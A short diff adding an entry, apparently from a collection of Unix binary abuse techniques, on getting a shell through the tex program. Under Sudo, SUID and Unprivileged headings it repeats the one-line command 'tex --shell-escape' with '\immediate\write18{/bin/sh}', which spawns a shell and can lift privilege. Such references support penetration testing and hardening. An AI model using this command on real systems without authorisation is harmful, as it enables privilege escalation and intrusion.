@@ -1,0 +1,14 @@
+tex
+===
+
+Shell
+-----
+
+[Sudo]
+    tex --shell-escape '\immediate\write18{/bin/sh}'
+
+[SUID]
+    tex --shell-escape '\immediate\write18{/bin/sh}'
+
+[Unprivileged]
+    tex --shell-escape '\immediate\write18{/bin/sh}'
